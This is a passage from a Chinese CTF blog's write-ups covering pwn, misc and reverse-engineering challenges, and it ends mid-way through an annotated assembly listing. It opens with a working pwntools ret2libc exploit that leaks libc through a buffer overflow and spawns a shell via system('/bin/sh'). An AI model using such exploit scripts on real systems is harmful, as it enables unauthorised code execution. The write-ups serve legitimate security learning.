class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x00400733</span><br>a.recvuntil(<span class="hljs-string">&quot;!\n&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>a.send(payload1)<br>a.recv()<span class="hljs-comment">#使用puts函数构造payload时需要再吃一个回车！！！</span><br>puts_addr=u64(a.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,puts_addr)<br>libcbase=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bin_addr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;!\n&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span>+p64(pop_rdi)+p64(bin_addr)+p64(system_addr)<br>a.send(payload2)<br>a.interactive()<br></code></pre></td></tr></table></figure><p>warning：在64位程序中，puts等函数的地址通常为7f开头，如果泄露出来的地址不是很可能是payload错了</p><p>warning2:在使用puts函数作为泄漏时，记得在接受时需要前面先吃一个回车</p><h1 id="buuoj-misc梅花香自苦寒来">buuoj misc梅花香自苦寒来</h1><p>打开后发现是图片，用winhex打开发现有很多十六进制数</p><p>在线网站(https://coding.tools/cn/hex-to-ascii)后发现这些十六进制文本是点的坐标</p><p>将左右括号去除掉后可以用matplotlib+numpy配合使用画出二维码图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>x, y = np.loadtxt(<span class="hljs-string">&#x27;./result.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27;,&#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><figure><img src="https://s2.loli.net/2022/04/30/2PZvzoRhMaGrpXy.png"alt="屏幕截图 2022-04-30 160642" /><figcaption aria-hidden="true">屏幕截图 2022-04-30 160642</figcaption></figure><h1 id="i春秋春季赛-misc-tiger">i春秋春季赛 misc tiger</h1><p>下载完附件后发现文件有一个图片，一个压缩包和一个提示文件。提示文件内容如下</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-number">1.</span>These are <span class="hljs-keyword">rot</span> <span class="hljs-keyword">for</span> <span class="hljs-number">47</span> days<br><span class="hljs-number">2.</span>Have you heard that lsb steganography also <span class="hljs-keyword">requires</span> a password?<br>ag2a<span class="hljs-string">`f76</span><br></code></pre></td></tr></table></figure><p>根据提示可知是rot47加密<strong>（这里我才疏学浅了，没看出来）</strong>，可以得到密码为：28a217fe</p><p>解压后得到一个key.zip文件和flag.zip的文件，输入后发现每个文件夹里都有相同的informa.txt.txt文件，这里又学到了：<strong>如果两个压缩文件都有相同的文件，就可以采用明文攻击，</strong>（利用ARCHCP)</p><figure><imgsrc="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDEvMDgvNWMzNDVkZmM2Y2Y3OS5wbmc?x-oss-process=image/format,png"alt="图片" /><figcaption aria-hidden="true">图片</figcaption></figure><p>得到后会出现一个二维码，扫码后出现flag is nothere，可以猜测是零宽字符，于是用在线网站yuanfux.github.io/zero-width-web/解密零宽字符，得到</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Owl wvn n xhkm <span class="hljs-keyword">SBWav </span>krttqbu gfq gja <span class="hljs-keyword">jhheu </span>up yljycxjpu, vvtx R <span class="hljs-keyword">jzeh </span>pydv usd zp lalhmk, ic <span class="hljs-keyword">brtkac </span>ya whep&#123;<span class="hljs-number">866</span>q3755-t358<span class="hljs-number">-5119</span>-txnr-<span class="hljs-keyword">juw666e8099m&#125;, </span>uroa okv!<br></code></pre></td></tr></table></figure><p>用vigenere解密就可以得到正确的答案</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">You are a good CTFer because you can solve my challenge, next I will give you my secret, my secret <span class="hljs-keyword">is</span> flag&#123;866d3755-c358-<span class="hljs-number">5119</span>-abeb-bda666a8099d&#125;, have <span class="hljs-function"><span class="hljs-keyword">fun</span>!</span><br></code></pre></td></tr></table></figure><h1 id="i春秋春季赛-misc-pintu">i春秋春季赛 misc pintu</h1><p>这道题我之前做过用montage加gaps拼图的题目，以为这道题也可以使用gaps来实现拼图，结果发现是行不通的，看了下答案才知道原来bmp中有可以隐写的地方，并根据此来进行拼图，学到了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">要先了解下<span class="hljs-keyword">bmp的文件头构造:</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfType：2字节，文件类型；</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfSize：4字节，文件大小；</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfReserved1：2字节，保留，必须设置为0；</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfReserved2：2字节，保留，必须设置为0；</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bfOffBits：4字节，从头到位图数据的偏移；</span><br></code></pre></td></tr></table></figure><p>所以保留字这里就可以藏信息，打开winhex发现文件在保留字这藏有信息</p><figure><img src="https://s2.loli.net/2022/05/11/tmiLu8AXowGSvKy.jpg"alt="209c38f8e146bd1e2ee82696c46441c3.jpg" /><figcaptionaria-hidden="true">209c38f8e146bd1e2ee82696c46441c3.jpg</figcaption></figure><p>可以猜测拼图是按这个来进行排序的（第六位为x，第八位为y)(os:谁想到的啊！！)</p><p>于是可以上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <span class="hljs-comment">#调用PIL中的Image库</span><br>png=Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">3840</span>,<span class="hljs-number">2160</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">14400</span>):<br>    file=<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>.bmp&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    x=file[<span class="hljs-number">6</span>]<br>    y=file[<span class="hljs-number">8</span>]<br>    image=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>.bmp&#x27;</span>)<br>    png.paste(image,(x*<span class="hljs-number">32</span>,y*<span class="hljs-number">18</span>))<br>png.save(<span class="hljs-string">&#x27;flag.bmp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>关于PIL库中Image的使用可以参考这个博客地址：<ahref="https://blog.csdn.net/dcrmg/article/details/102963336">PIL库中Image的使用</a></p><p>于是就可以得到正确的图片</p><figure><img src="https://s2.loli.net/2022/05/11/chye4EH6YJZoivV.jpg"alt="flag1" /><figcaption aria-hidden="true">flag1</figcaption></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf做题记录1</title>
    <link href="/2022/04/08/ctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/"/>
    <url>/2022/04/08/ctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
    
    <content type="html"><![CDATA[<h1 id="xctf-babyre">xctf babyre</h1><p>第一次做smc程序，看了wp学了下打patch。</p><p>打开ida启动反汇编就发现judge是全程序的关键，但是judge在开头进行了异或操作，导致反汇编不出来。于是可以用ida打patch来让ida正确反汇编函数。</p><figure><img src="https://s2.loli.net/2022/03/06/jfJm9ZKcvklN7AD.png"alt="屏幕截图 2022-03-05 203908" /><figcaption aria-hidden="true">屏幕截图 2022-03-05 203908</figcaption></figure><figure><img src="https://s2.loli.net/2022/03/06/yIwe5nNEHupZjko.png"alt="屏幕截图 2022-03-05 204106" /><figcaption aria-hidden="true">屏幕截图 2022-03-05 204106</figcaption></figure><p>如果是花指令，就可以使用edit-patchprogrammer将字节码改成nop跳过花指令。如果是需要编写脚本来正确反编译，可以在file-scriptcommand里编写脚本(7.5无法直接使用patchbyte()指令，需要from idc_bc695import *）。</p><figure><img src="https://s2.loli.net/2022/03/06/HuGaviSNzsCVOrA.png"alt="屏幕截图 2022-03-05 204927" /><figcaption aria-hidden="true">屏幕截图 2022-03-05 204927</figcaption></figure><p>然后再使用快捷键c重新生成汇编代码，发现已经有汇编代码正确生成，再使用快捷键p重新生成函数即可发现关键函数。</p><h1 id="xctf-easyhook">xctf easyhook</h1><p>打开ida尝试进行静态分析，但因为太多干扰函数和复杂的winapi分析了半小时没分析出来（汗），看了下wp，说用动态调试好解决，于是便进行了动态调试分析。</p><p>先直接让程序运行，直接在提示输入的函数下断点，运行输入后提示错误，说明判断条件在函数内部。进入函数后狂按f8，发现程序在writefile后会入栈一串加密的字符串，于是可以判定程序在此进行判断</p><figure><img src="https://s2.loli.net/2022/03/06/PVj1pkTDelZYb3n.png"alt="屏幕截图 2022-03-06 131739" /><figcaption aria-hidden="true">屏幕截图 2022-03-06 131739</figcaption></figure><p>我在找加密后的flag这里掉了坑，一直以为后面call401240里给的This_is_not_the_flag是加密后的flag，导致写出的脚本一直得不到flag。后来看了wp才知道原来程序在加密后就直接进行了判断。</p><figure><img src="https://s2.loli.net/2022/03/06/yDGY1LH5pItUb8M.png"alt="屏幕截图 2022-03-06 131437" /><figcaption aria-hidden="true">屏幕截图 2022-03-06 131437</figcaption></figure><p>最后写出脚本</p><figure><img src="https://s2.loli.net/2022/03/06/zXLoJuFdkNMfCI2.png"alt="屏幕截图 2022-03-06 131756" /><figcaption aria-hidden="true">屏幕截图 2022-03-06 131756</figcaption></figure><h1 id="xctf-easyre">xctf EasyRe</h1><p>打开ida后反编译得到</p><figure><img src="https://s2.loli.net/2022/03/06/S3HNRp1jhAU5eMk.png"alt="屏幕截图 2022-03-06 153650" /><figcaption aria-hidden="true">屏幕截图 2022-03-06 153650</figcaption></figure><p>程序很简单就简单的异或，于是直接写脚本，但是却得到了反的flag:}NsDkw9sy3qPto4UqNx{galf</p><figure><img src="https://s2.loli.net/2022/03/06/c4oD7YL8vx2dkqE.png"alt="屏幕截图 2022-03-06 154358" /><figcaption aria-hidden="true">屏幕截图 2022-03-06 154358</figcaption></figure><p>于是开始找原因，后来在汇编代码中发现了问题，原来在汇编代码中，他是从后到前开始异或的，但是在反编译中却没编译出来。以后还是不能全部相信f5反编译。</p><h1 id="xctf-mysterious">xctf mysterious</h1><figure><img src="https://s2.loli.net/2022/03/09/nwK1NJSGxfzhjsF.png"alt="image-20220309163603717" /><figcaption aria-hidden="true">image-20220309163603717</figcaption></figure><p>打开ida发现是windows程序，打开winmain发现程序运算逻辑，先用getdlgitemtextaapi输入内容，然后运用atoi将字符串转换成数字，然后将转换后的数字加一，再将转换后的数字变成字符串，最后拼接输出。这题我卡的地方就在于不知道atoi函数和itoa函数，导致我跟进进去没分析出来www</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp">itoa()函数<br><br>itoa():<span class="hljs-built_in">char</span> *itoa( <span class="hljs-built_in">int</span> <span class="hljs-keyword">value</span>, <span class="hljs-built_in">char</span> *<span class="hljs-built_in">string</span>,<span class="hljs-built_in">int</span> radix);<br><br>原型说明：<br><br><span class="hljs-keyword">value</span>：欲转换的数据。<br><span class="hljs-built_in">string</span>：目标字符串的地址。<br>radix：转换后的进制数，可以是<span class="hljs-number">10</span>进制、<span class="hljs-number">16</span>进制等，范围必须在 <span class="hljs-number">2</span><span class="hljs-number">-36</span>。<br><br>功能：将整数<span class="hljs-keyword">value</span> 转换成字符串存入<span class="hljs-built_in">string</span> 指向的内存空间 ,radix 为转换时所用基数(保存到字符串中的数据的进制基数)。<br>返回值：函数返回一个指向 str，无错误返回。<br></code></pre></td></tr></table></figure><h1 id="xctf-parallel-comparator-200">xctf parallel-comparator-200</h1><p>读源码的题</p><figure><img src="https://s2.loli.net/2022/03/09/YOZcURWj3C9Es2J.png"alt="屏幕截图 2022-03-09 185426" /><figcaption aria-hidden="true">屏幕截图 2022-03-09 185426</figcaption></figure><p>首先题目标准流输入了一个长度为21的字符串，然后对字符串进行了操作，并返回1，接着看字符串处理</p><figure><img src="https://s2.loli.net/2022/03/09/n1EfI4bq59hoXGv.png"alt="屏幕截图 2022-03-09 185706" /><figcaption aria-hidden="true">屏幕截图 2022-03-09 185706</figcaption></figure><p>先定义了一个随机数，随机数的范围为97-123</p><figure><img src="https://s2.loli.net/2022/03/09/2drmO3ZFWlSquUC.png"alt="屏幕截图 2022-03-09 185352" /><figcaption aria-hidden="true">屏幕截图 2022-03-09 185352</figcaption></figure><p>后定义了一个二维数组 [] [0]存放随机数，[] [1]存放题目给定的数组，[][2]存放用户输入的字符串</p><figure><img src="https://s2.loli.net/2022/03/09/gkRWBK7xM6uO82P.png"alt="屏幕截图 2022-03-09 185949" /><figcaption aria-hidden="true">屏幕截图 2022-03-09 185949</figcaption></figure><p>这串代码意思是checking函数的返回值result必须全部为零，所以接着看checking函数内部</p><figure><img src="https://s2.loli.net/2022/03/09/GSuEZMDIfP3VRsX.png"alt="屏幕截图 2022-03-09 185342" /><figcaption aria-hidden="true">屏幕截图 2022-03-09 185342</figcaption></figure><p>再异或一次(argument[1]+argument[0])就可以得到flag，因为不知道随机数是多少所以采取暴力手法</p><figure><img src="E:\屏幕截图\屏幕截图%202022-03-09%20190209.png"alt="屏幕截图 2022-03-09 190209" /><figcaption aria-hidden="true">屏幕截图 2022-03-09 190209</figcaption></figure><p>得到flag:lucky_hacker_you_are</p><h1 id="xctf-testre">xctf testre</h1><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">base64字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<span class="hljs-number">0123456789</span>+/<br>base58字母表：<span class="hljs-number">123456789</span>ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz<br>base32字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="hljs-number">123456789</span><br>base16字母表：abcdefghijklmnopqrstuvwxyz<span class="hljs-number">123456789</span><br></code></pre></td></tr></table></figure><p>打开后发现两个字母表一个是64一个是58,将字符串用这两个字母表尝试下可以得到flag</p><h1 id="xctf-simple-check">xctf simple check</h1><p>这道题尝试了下gdb调试和od调试,od调试没啥说的。主要是联系linux下的gdb调试。</p><p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常见的gdb命令符<br><br><span class="hljs-bullet">1.</span> file xxxxx 挂载文件<br><span class="hljs-bullet">2.</span> b xxxx 下断点<br><span class="hljs-bullet">3.</span> n 单步步过<br><span class="hljs-bullet">4.</span> r 运行程序<br><span class="hljs-bullet">5.</span> s 单步步入<br><span class="hljs-bullet">6.</span> quit 退出调试<br></code></pre></td></tr></table></figure></p><p>题目只要在check函数判断正确就可以输出flag，可以用动态调试将check函数返回的eax值手动改为1，强制判断正确，输出正确的flag。静态调试没分析出来，目前还在看题解的静态调试www</p><h1 id="xctf-easyre-153">xctf easyre-153</h1><p>打开程序找到main函数后，先对程序有个大致了解。</p><figure><img src="https://s2.loli.net/2022/03/17/VWqNFBagMf6r8Tt.png"alt="屏幕截图 2022-03-17 194126" /><figcaption aria-hidden="true">屏幕截图 2022-03-17 194126</figcaption></figure><figure><img src="https://s2.loli.net/2022/03/17/IgPLeS6KjBZGdiH.png"alt="屏幕截图 2022-03-17 194141" /><figcaption aria-hidden="true">屏幕截图 2022-03-17 194141</figcaption></figure><p>看到关键函数只有一个printf函数，我猜测应该是程序ida在汇编是发生错误，有可能是题目故意让ida反编译不吹来。找到造成反编译错误点比较困难。</p><p>但看到后面有两个连续的if判断，我最开始想到的方法是使用动态调试跳过这两个判断语句直接的到flag,但实际上在linux使用gdb调试时，我下断点调试时，不知道为啥gdb遇到输入的时候按ctrl+z或者ctrl+j无法结束输入（是我太菜了，悲）。没法结束判断条件就没法跳过后面的两个判断，所以gdb调试只能作罢。又开始了静态分析读代码。</p><p>在查看了lol的汇编代码后，我发现确实是ida没有反汇编出来，于是只好一点一点看汇编。</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">080485</span>F4 lol             <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>               ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> main+EE↓p</span><br>.text:080485F4                                         ;<span class="hljs-title"> DATA</span> XREF:<span class="hljs-title"> main+AC↓o</span><br>.text:080485F4<br>.text:080485F4<span class="hljs-title"> var_13</span>          =<span class="hljs-title"> byte</span> ptr -13h<br>.text:080485F4<span class="hljs-title"> var_12</span>          =<span class="hljs-title"> byte</span> ptr -12h<br>.text:080485F4<span class="hljs-title"> var_11</span>          =<span class="hljs-title"> byte</span> ptr -11h<br>.text:080485F4<span class="hljs-title"> var_10</span>          =<span class="hljs-title"> byte</span> ptr -10h<br>.text:080485F4<span class="hljs-title"> var_F</span>           =<span class="hljs-title"> byte</span> ptr -0Fh<br>.text:080485F4<span class="hljs-title"> var_E</span>           =<span class="hljs-title"> byte</span> ptr -0Eh<br>.text:080485F4<span class="hljs-title"> var_D</span>           =<span class="hljs-title"> byte</span> ptr -0Dh<br>.text:080485F4<span class="hljs-title"> var_C</span>           =<span class="hljs-title"> dword</span> ptr -0Ch<br>.text:080485F4<span class="hljs-title"> arg_0</span>           =<span class="hljs-title"> dword</span> ptr  8<br>.text:080485F4<br>.text:080485F4<span class="hljs-title">                 push</span> <span class="hljs-title">   ebp</span><br>.text:080485F5<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebp,</span> esp<br>.text:080485F7<span class="hljs-title">                 sub</span> <span class="hljs-title">    esp,</span> 28h<br>.text:080485FA<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]   //给定基地址<br>.text:080485FD<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 1   //基地址位置+1<br>.text:08048600<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]  //将地址的值赋给eax<br>.text:08048603<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax //将值保存<br>.text:08048605<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]  //重复刚才的动作<br>.text:08048608<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 1<br>.text:0804860B<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804860E<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]  //将两次保存的值赋值给eax ，相当于乘以2<br>.text:08048611<span class="hljs-title">                 mov</span>     [ebp+var_13],<span class="hljs-title"> al</span> //将保存的eax值赋值给ebp+var_13的地址上 <br>               可以得到[eax+var_13]=2*[eax+arg_0+1]<br>.text:08048614<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0] <br>.text:08048617<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 4<br>.text:0804861A<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804861D<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:0804861F<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048622<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 5<br>.text:08048625<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048628<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:0804862B<span class="hljs-title">                 mov</span>     [ebp+var_12],<span class="hljs-title"> al</span><br>               [ebp+var_12]=[eax+arg_0+4]+[eax+arg_0+5]<br>.text:0804862E<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048631<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 8<br>.text:08048634<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048637<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:08048639<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:0804863C<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 9<br>.text:0804863F<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048642<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:08048645<span class="hljs-title">                 mov</span>     [ebp+var_11],<span class="hljs-title"> al</span><br>               [ebp+var_11]=[eax+arg_0+8]+[eax+arg_0+9]<br>.text:08048648<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:0804864B<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 0Ch<br>.text:0804864E<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048651<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:08048653<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048656<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 0Ch<br>.text:08048659<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804865C<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:0804865F<span class="hljs-title">                 mov</span>     [ebp+var_10],<span class="hljs-title"> al</span><br>                [ebp+var_10]=2*[eax+arg_0+12]<br>.text:08048662<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048665<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 12h<br>.text:08048668<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804866B<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:0804866D<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048670<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 11h<br>.text:08048673<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048676<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:08048679<span class="hljs-title">                 mov</span>     [ebp+var_F],<span class="hljs-title"> al</span><br>                [ebp+var_15]=[eax+arg_0+17]+[eax+arg_0+18]<br>.text:0804867C<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:0804867F<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 0Ah<br>.text:08048682<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048685<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:08048687<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:0804868A<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 15h<br>.text:0804868D<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048690<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:08048693<span class="hljs-title">                 mov</span>     [ebp+var_E],<span class="hljs-title"> al</span><br>                [ebp+var_14]=[eax+arg_0+10]+[eax+arg_0+21]<br>.text:08048696<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048699<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 9<br>.text:0804869C<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804869F<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:080486A1<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:080486A4<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 19h<br>.text:080486A7<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:080486AA<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:080486AD<span class="hljs-title">                 mov</span>     [ebp+var_D],<span class="hljs-title"> al</span><br>             [ebp+var_13]=[eax+arg_0+9]+[eax+arg_0+25]<br>.text:080486B0<span class="hljs-title">                 mov</span>     [ebp+var_C], 0<br>            [ebp+var_12]=0<br>.text:080486B7<span class="hljs-title">                 cmp</span>     [ebp+var_C], 1<br>.text:080486BB<span class="hljs-title">                 jnz</span> <span class="hljs-title">    short</span> 